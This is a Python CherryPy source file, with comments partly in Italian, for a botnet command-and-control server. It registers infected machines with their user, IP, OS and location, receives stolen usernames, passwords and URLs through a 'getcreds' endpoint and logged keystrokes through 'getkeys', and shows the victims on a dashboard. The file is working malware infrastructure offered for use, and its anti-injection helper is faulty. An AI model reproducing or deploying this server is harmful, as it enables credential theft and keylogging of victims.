''' Server file: tutto il backend va' qui '''
''' Server file: all the backend is here '''

import sqlite3
import cherrypy
import jinja2
import os
from binascii import hexlify, unhexlify
import sys
from settings import *

def anti_sqli(string):
    ''' Controllo inutile dato che andremmo ad encodare in hex prima di inserire nel db, ma e' sempre meglio ricordare
        che la sicurezza dell applicativo e' fondamentale '''
    for keyword in SQL_KEYWORDS:
        string = str(string)
        if keyword in string:
            string.replace(keyword, '')
        elif keyword.lower() in string:
            string.replace(keyword.lower(), '')
        return string.encode()
        

def authenticate(realm, user, passwd):
    if user == USER and passwd == PASSWD:
        return True
    return False

conf = {
    '/dashboard': {
       'tools.auth_basic.on': True,
       'tools.auth_basic.realm': 'localhost',
       'tools.auth_basic.checkpassword': authenticate
    },
    '/bot': {
       'tools.auth_basic.on': True,
       'tools.auth_basic.realm': 'localhost',
       'tools.auth_basic.checkpassword': authenticate
    },
    '/welcome':{},
    '/getcreds':{},
    '/getkeys':{}
}

class Server(object):
    
    @cherrypy.expose
    def index(self):
        raise cherrypy.HTTPRedirect("/dashboard")
        cherrypy.log("USER: {} \n\tPASSWD: {}".format(USER, PASSWD))
        
    @cherrypy.expose('dashboard')
    def dashboard(self):
        with open(PATH_CC+"\\DashBoard\\dashboard.html", 'r') as html:
            template = jinja2.Template(html.read())
        with sqlite3.connect(DB_PATH+DB_NAME) as db:
            try:
                db_exe = db.cursor()
                db_bots = db_exe.execute("SELECT DISTINCT * FROM {}".format('Bots')).fetchall()
                bots_num = db_exe.execute("SELECT COUNT(DISTINCT Key) FROM {}".format('Bots')).fetchall()[0][0]
                win_bots = db_exe.execute("SELECT COUNT(DISTINCT Key) FROM {} WHERE Os='57696e646f7773'".format('Bots')).fetchall()[0][0]
                nix_bots = db_exe.execute("SELECT COUNT(DISTINCT Key) FROM {} WHERE Os='4c696e7578'".format('Bots')).fetchall()[0][0]
            except sqlite3.DatabaseError:
                print("An error occured during the selection of the data")
            finally:
                db.commit()
                db_exe.close()
        return template.render({'db_bots':db_bots, 'unhexlify':unhexlify, 'bots_num':bots_num, 'win_bots':win_bots, 'nix_bots':nix_bots})
    
    @cherrypy.expose
    def bot(self, key): 
        key = hexlify(anti_sqli(key)).decode()
        with open(PATH_CC+"\\DashBoard\\bot.html") as html:
            template = jinja2.Template(html.read())
        bot_db = ''
        creds_db = ''
        keys_db = ''
        with sqlite3.connect(DB_PATH+DB_NAME) as db:
            db_exe = db.cursor()
            try:
                print(key)
                bot_db = db_exe.execute("SELECT * FROM {} WHERE Key='{}'".format('Bots', key)).fetchall()
                creds_db = db_exe.execute("SELECT * FROM {} WHERE Key='{}'".format('Creds', key)).fetchall()
                keys_db = db_exe.execute("SELECT * FROM {} WHERE Key='{}'".format('Keys', key)).fetchall()
            except sqlite3.DatabaseError as e:
                print("An error occured selecting the data from the dbs")
                print(e)
            finally:
                db.commit()
                db_exe.close()
        return template.render({'bot_db':bot_db, 'creds_db':creds_db, 'keys_db':keys_db, 'unhexlify':unhexlify})  
    
    @cherrypy.expose
    def welcome(self, key, user, ip, os, enum, geo): # key == uuid
        key = hexlify(anti_sqli(key)).decode()
        user = hexlify(anti_sqli(user)).decode()
        ip = hexlify(anti_sqli(ip)).decode()
        os = hexlify(anti_sqli(os)).decode()
        enum = hexlify(anti_sqli(enum)).decode()
        geo = hexlify(anti_sqli(geo)).decode()
        with sqlite3.connect(DB_PATH+DB_NAME) as db:
            db_exe = db.cursor()
            db_exe.execute("INSERT INTO {} VALUES (?,?,?,?,?,?)".format('Bots'), (key, user, ip, os, enum, geo,))
            db.commit()
            db_exe.close()
        with open(PATH_API+"welcome.html") as html:
            template = jinja2.Template(html.read())
        return template.render({'user': USER})
    
    @cherrypy.expose
    def getcreds(self, key, user, passwd, url):
        ''' Ricezione delle credenziali dal bot'''
        key = hexlify(anti_sqli(key)).decode()
        user = hexlify(anti_sqli(user)).decode()
        passwd = hexlify(anti_sqli(passwd)).decode()
        url = hexlify(anti_sqli(url)).decode()
        with sqlite3.connect(DB_PATH+DB_NAME) as db:
            db_exe = db.cursor()
            db_exe.execute("INSERT INTO {} VALUES (?,?,?,?)".format("Creds"), (key, user, passwd, url,))
            db.commit()
            db_exe.close()
            
    @cherrypy.expose
    def getkeys(self, key, text):
        ''' Ricezione dei tasti premuti dal bot '''
        key = hexlify(anti_sqli(key)).decode()
        with sqlite3.connect(DB_PATH+DB_NAME) as db:
            db_exe = db.cursor()
            db_exe.execute("INSERT INTO {} VALUES (?,?)".format("Keys"), (key, text,))
            db.commit()
            db_exe.close()
        
#     @cherrypy.expose
#     def getcmds(self, key):
#     ''' Utilizzare nel caso in cui ci siano piu' moduli e piu' comandi da utilizzare e si vogliano dare nomi specifici a questi per eseguirli '''
#         with open(PATH_API+"getcmds.html") as html:
#             template = jinja2.Template(html.read())
#         with open(DB_PATH+DB_NAME) as db:
#             db_exe = db.cursor()
#             try:
#                 db_cmds = db_exe.execute("SELECT * FROM Cmds").fetchall() #Cmds sarebbe una tabella che contiene i comandi dati
#             except sqlite3.DatabaseError:
#                 print("Error selecting the data from Cmds table")
#             finally:
#                 db.commit()
#                 db_exe.close()
#         return template.render({'command':db_cmds})
          
    
if __name__ == "__main__":
    try:
        cherrypy.config.update({'server.socket_port': PORT})
        cherrypy.quickstart(Server(), '/', conf)
    except KeyboardInterrupt:
        cherrypy.engine.block()
        cherrypy.engine.stop()
        sys.exit()